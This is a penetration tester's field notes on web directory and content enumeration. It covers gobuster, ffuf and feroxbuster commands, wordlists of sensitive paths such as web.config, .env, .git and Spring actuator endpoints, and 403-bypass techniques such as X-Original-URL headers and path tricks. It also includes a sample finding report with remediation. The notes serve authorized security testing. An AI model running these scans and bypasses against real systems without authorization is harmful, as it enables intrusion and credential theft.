# Directory & Content Enumeration — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Reconnaissance & Attack Surface Discovery
>
> **Tools:** Gobuster, ffuf, Feroxbuster, Dirsearch, Burp Suite
>
> **Real-world impact:** Directory enumeration is the reconnaissance technique I rely on to find the attack surface developers forgot to protect. In enterprise applications, the most critical findings — exposed admin panels, unauthenticated API endpoints, configuration files, Spring Boot Actuator, Swagger UI — are never linked from the main application. They exist because developers deployed features without registering them in the application's navigation, assuming "nobody knows the URL" is a security control. It is not.

---

## 🧠 Why This Matters in Enterprise Engagements

The external application surface is what developers think about when they think about security. The internal admin panel at `/admin`, the debug endpoint at `/actuator`, the API documentation at `/swagger-ui`, the legacy endpoint at `/api/v1/` that was supposed to be retired — these are the targets.

In my enterprise engagements, directory enumeration runs in the first 30 minutes of every assessment, in parallel with manual browsing. By the time I finish mapping the visible application surface in Burp, the enumeration tools have already found the hidden one.

---

## 🔍 Phase 1 — Pre-Enumeration Intelligence Gathering

Before running a single wordlist, extract maximum intelligence from sources that require zero requests.

```
Step 1 — robots.txt and sitemap.xml (always first):
  https://target.company.com/robots.txt
  https://target.company.com/sitemap.xml

  Disallowed entries in robots.txt = highest-priority enumeration targets
  Sitemap = complete URL map of the application

Step 2 — JavaScript source file mining (Burp JS Miner extension):
  Browse the application with Burp running
  JS Miner extension extracts all API endpoints from JS bundles
  Finds: /api/v2/internal, /admin/users, /api/reports/export
  These are real paths already in the application code

Step 3 — Wayback Machine / Common Crawl:
  https://web.archive.org/web/*/target.company.com/*
  → Historical URLs that may still exist but are no longer linked
  → Finds: old API versions, deprecated admin panels, legacy endpoints

Step 4 — Google Dorking:
  site:target.company.com filetype:php
  site:target.company.com inurl:admin
  site:target.company.com inurl:api
  → Indexed pages Google found that the application doesn't link to

Step 5 — Technology fingerprinting before choosing wordlists:
  Check: Server: Microsoft-IIS → use IIS-specific wordlist
  Check: X-Powered-By: ASP.NET → .NET paths (/App_Data/, /bin/, /web.config)
  Check: Set-Cookie: PHPSESSID → PHP paths (/phpinfo.php, /config.php)
  Check: Server: Apache → Apache paths (/server-status, /.htaccess)
```

---

## 🔧 Phase 2 — Tool Usage in Enterprise Context

### Gobuster — My Primary Tool

```bash
# Standard enterprise web scan
gobuster dir \
  -u https://app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -x asp,aspx,html,js,json,txt,bak,old,zip,config \
  -t 20 \
  -b 404,400 \
  -o gobuster_initial.txt \
  --no-error

# Authenticated scan (use session cookie from Burp login)
gobuster dir \
  -u https://app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -c "session=eyJhbGciOiJIUzI1NiJ9..." \
  -H "Authorization: Bearer TOKEN" \
  -t 20 \
  -o gobuster_auth.txt

# ASP.NET / IIS specific (enterprise .NET apps)
gobuster dir \
  -u https://app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt \
  -x asp,aspx,config,bak,old \
  -o gobuster_iis.txt

# API version and endpoint enumeration
gobuster dir \
  -u https://app.company.com/api \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
  -x json \
  -o gobuster_api.txt

# Proxy through Burp (captures all traffic for evidence)
gobuster dir \
  -u https://app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/common.txt \
  --proxy http://127.0.0.1:8080 \
  -o gobuster_burp.txt

# Thread management for enterprise environments:
# -t 10: conservative (shared/production environments)
# -t 20: standard (isolated test environments)
# -t 50: aggressive (only with explicit client permission)
# Never exceed scope agreement on request rate
```

### ffuf — Fastest, Most Flexible

```bash
# Basic directory fuzzing
ffuf -u https://app.company.com/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,201,301,302,401,403 \
  -o ffuf_dirs.json \
  -of json

# Filter by response size (remove custom 404 pages):
# First run without filter to find 404 page size:
ffuf -u https://app.company.com/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/common.txt \
  -mc all -fw 0
# Find most common response size → that is the 404 page size
# Then filter it: -fs 2847 (replace with actual 404 size)

ffuf -u https://app.company.com/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,201,301,302,401,403 \
  -fs 2847 \
  -o ffuf_clean.json

# API parameter fuzzing
ffuf -u https://api.company.com/api/v1/users?FUZZ=test \
  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,201 \
  -fs 0

# Virtual host enumeration (finds subdomains on same IP)
ffuf -u https://app.company.com \
  -H "Host: FUZZ.company.com" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,201,301,302 \
  -fs 2847

# Authenticated with bearer token
ffuf -u https://api.company.com/api/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..." \
  -mc 200,201,401,403
```

### Feroxbuster — Deep Recursive Scanning

```bash
# Auto-recursive scan (my preference for thorough internal app testing)
feroxbuster \
  -u https://app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -x asp,aspx,html,js,config,bak \
  -d 3 \
  --filter-status 404,400 \
  -o feroxbuster_deep.txt

# With authentication
feroxbuster \
  -u https://app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -H "Cookie: session=eyJhbGciOiJIUzI1NiJ9..." \
  -H "Authorization: Bearer TOKEN" \
  -d 2 \
  -o feroxbuster_auth.txt

# When to use Feroxbuster vs Gobuster:
# Gobuster: initial fast sweep of top-level paths
# Feroxbuster: deep recursive dive into discovered interesting directories
# Example: Gobuster finds /admin → Feroxbuster recurses into /admin/
```

---

## 🎯 Phase 3 — Enterprise High-Value Target Wordlists

```
Priority 1 — Technology-specific (always use with fingerprinted tech):

ASP.NET / IIS:
  /App_Data/              → SQL Server .mdf files, XML data
  /App_Code/              → C# code files
  /bin/                   → Compiled .dll files
  /web.config             → Connection strings, API keys
  /global.asax            → Application configuration
  /elmah.axd              → ELMAH error logging (unauthenticated!)
  /trace.axd              → .NET trace viewer (exposes request history)
  /ScriptResource.axd     → ASP.NET script handler
  /WebResource.axd        → ASP.NET web resource handler

Spring Boot / Java:
  /actuator               → Spring Boot management endpoint
  /actuator/env           → Full environment dump
  /actuator/heapdump      → Memory dump
  /actuator/mappings      → All URL routes
  /swagger-ui.html        → API documentation
  /v2/api-docs            → Swagger JSON spec
  /h2-console             → H2 database web console (default unauth!)
  /console                → Play Framework or JRuby console

PHP:
  /phpinfo.php            → PHP configuration
  /info.php               → PHP information
  /phpmyadmin/            → MySQL admin
  /adminer.php            → Lightweight DB admin
  /wp-admin/              → WordPress admin
  /wp-config.php          → WordPress credentials
  /.htaccess              → Apache access control rules
  /config.php             → Application configuration

Priority 2 — Universal targets (test on every application):
  /.git/                  → Source code repository
  /.git/config            → Git remote URL (may include credentials)
  /.env                   → Environment variables
  /backup/                → Backup files
  /admin/                 → Admin panel
  /api/                   → API root
  /swagger/               → API docs
  /graphql                → GraphQL endpoint
  /robots.txt             → Path hints
  /.well-known/           → Security.txt, JWKS, OIDC discovery
  /server-status          → Apache server status
  /nginx_status           → Nginx status
```

---

## 🚪 Phase 4 — 403 Bypass Techniques

A 403 response means the path exists but access is denied — it is not a dead end. In enterprise environments, 403 bypasses are consistently productive because access controls are often implemented inconsistently.

```
Method 1 — Header-based bypass:
  X-Original-URL: /admin
  X-Rewrite-URL: /admin
  X-Custom-IP-Authorization: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Client-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1

  In Burp Repeater:
  GET / HTTP/1.1
  Host: app.company.com
  X-Original-URL: /admin
  → If 200 = server processes X-Original-URL header as the path

Method 2 — Path manipulation:
  /admin          → 403 (baseline)
  /admin/         → try with trailing slash
  //admin/        → double slash
  /ADMIN          → uppercase
  /Admin          → mixed case
  /admin/.        → dot suffix
  /admin/..;/     → path traversal suffix
  /%2fadmin       → URL encoded slash
  /admin%20       → URL encoded space
  /admin%09       → URL encoded tab
  /admin;/        → semicolon (Nginx/Tomcat bypass)

Method 3 — HTTP method switching:
  GET /admin   → 403
  POST /admin  → 200? (different handler for different methods)
  HEAD /admin  → 200? (HEAD sometimes bypasses GET restrictions)

Method 4 — API version switching:
  /api/v2/admin  → 403
  /api/v1/admin  → 200? (old version without auth check)
  /API/v2/admin  → 200? (case-insensitive routing)

In Burp Intruder:
  Capture GET /admin/
  Add payload position around the path
  Use a 403 bypass wordlist (many available in SecLists)
  Filter results for status 200 or different content length
```

> **Enterprise context:** During an engagement on an enterprise .NET application, the main admin panel at `/admin` returned 403. By adding the header `X-Original-URL: /admin` to a request to the root path `/`, I received a 200 response with full admin panel content. The IIS server processed the X-Original-URL header as the actual request path — bypassing the URL-level access control while the path-based restriction checked only the original URL `/`. This was the entry point to the entire admin section of the application.

---

## 📊 Wordlist Selection Strategy

```
Engagement type → Wordlist choice:

Quick initial recon (< 5 mins):
  SecLists/Discovery/Web-Content/common.txt          (4,713 entries)

Standard engagement (15-20 mins):
  SecLists/Discovery/Web-Content/raft-medium-directories.txt  (30,000 entries)
  SecLists/Discovery/Web-Content/raft-medium-files.txt        (17,000 entries)

Thorough assessment (45-60 mins):
  SecLists/Discovery/Web-Content/raft-large-directories.txt   (62,000 entries)
  SecLists/Discovery/Web-Content/raft-large-files.txt         (37,000 entries)

API-specific:
  SecLists/Discovery/Web-Content/api/objects.txt
  SecLists/Discovery/Web-Content/api/actions.txt
  SecLists/Discovery/Web-Content/api/api-endpoints.txt

Technology-specific (after fingerprinting):
  SecLists/Discovery/Web-Content/IIS.fuzz.txt        (ASP.NET/IIS)
  SecLists/Discovery/Web-Content/Apache.fuzz.txt     (Apache/PHP)
  SecLists/Discovery/Web-Content/tomcat.txt          (Java/Tomcat)
  SecLists/Discovery/Web-Content/spring-boot.txt     (Spring Boot)
```

---

## 🗂️ Systematic Testing Checklist

```
PRE-SCAN
☐ Check robots.txt and sitemap.xml manually
☐ Identify technology stack from response headers
☐ Run JS Miner in Burp to extract endpoints from JS bundles
☐ Check Wayback Machine for historical URLs
☐ Select appropriate wordlists based on tech stack

SCANNING
☐ Phase 1: Quick gobuster with common.txt (get fast wins in 2 minutes)
☐ Phase 2: Full scan with raft-medium + extensions
☐ Phase 3: Technology-specific wordlist (IIS/Spring/Apache)
☐ Phase 4: API endpoint enumeration on /api/, /v1/, /v2/
☐ Route scan through Burp proxy for evidence capture

POST-SCAN INVESTIGATION
☐ All 200 responses: visit manually in Burp Repeater
☐ All 403 responses: try bypass techniques
☐ All 301/302 responses: follow redirect target
☐ All 401 responses: note for credential testing
☐ Recurse feroxbuster into interesting directories found
☐ Any .git/ found: run gitdumper tool to extract repository
☐ Any .env/.config/web.config found: read content immediately
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Unauthenticated Admin Panel Exposed at `/admin/users`

**Severity:** Critical | **CVSS v3.1:** 10.0

**Discovery method:** Gobuster directory enumeration with IIS.fuzz.txt wordlist

```
Command used:
gobuster dir -u https://internal-app.company.com \
  -w /opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt \
  -x aspx,config -t 20 -o gobuster_results.txt

Output:
/admin/              [Status: 403] [Size: 1247]
/admin/users/        [Status: 200] [Size: 45821]   ← Critical
/admin/config/       [Status: 200] [Size: 8234]    ← Critical
/elmah.axd           [Status: 200] [Size: 23451]   ← High (error log viewer)
/web.config          [Status: 200] [Size: 4521]    ← Critical (credentials)

Manual verification: GET /admin/users/ returns full user management dashboard
with ability to create, modify, and delete all user accounts.
No authentication prompt presented.
```

**Remediation:**
- Require authentication on all `/admin/*` paths at the application level
- Implement IP allowlisting for admin panel access (corporate network only)
- Add MFA requirement for all admin authentication
- Block `/elmah.axd` and diagnostic endpoints from public access

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. JS source mining finds more than directory brute forcing in modern apps.**
Modern enterprise SPAs have few traditional paths to enumerate — they are all JavaScript-driven. The endpoint list is in the JavaScript bundle. Always run JS Miner in Burp before launching directory enumeration. The endpoints you find in JS are real, verified paths — not guesses from a wordlist.

**2. Technology-specific wordlists return 10x more value than generic ones.**
Scanning a Spring Boot application with a generic wordlist misses `/actuator/env`. Scanning an ASP.NET app without the IIS wordlist misses `/elmah.axd` and `/trace.axd`. Spend 2 minutes fingerprinting the technology from response headers before selecting wordlists — it dramatically improves results.

**3. Every 403 is worth investigating in enterprise internal applications.**
External applications implement 403 correctly because they face public attack. Internal enterprise tools are built by developers who assumed the network perimeter was sufficient protection. A 403 on an internal tool often means the path exists, the developer added a rule, but the rule has edge cases — capitalisation bypass, method bypass, header bypass. Always test.

**4. Route directory enumeration through Burp proxy.**
Adding `--proxy http://127.0.0.1:8080` to any enumeration tool captures every request in Burp HTTP History. When you find an interesting endpoint during enumeration, the full request is already in Repeater — you do not need to reconstruct it. This also provides complete evidence for your report.

**5. Do not report every discovered path — prioritise by finding, not by status code.**
The enumeration output list does not go in the report. What goes in the report are the specific paths that represent security vulnerabilities: exposed admin panel, accessible config file, unauthenticated API. The enumeration is the process; the finding is the accessible sensitive resource at the end of it.

---

## 🔗 References
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)
- [Gobuster GitHub](https://github.com/OJ/gobuster)
- [ffuf GitHub](https://github.com/ffuf/ffuf)
- [Feroxbuster GitHub](https://github.com/epi052/feroxbuster)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
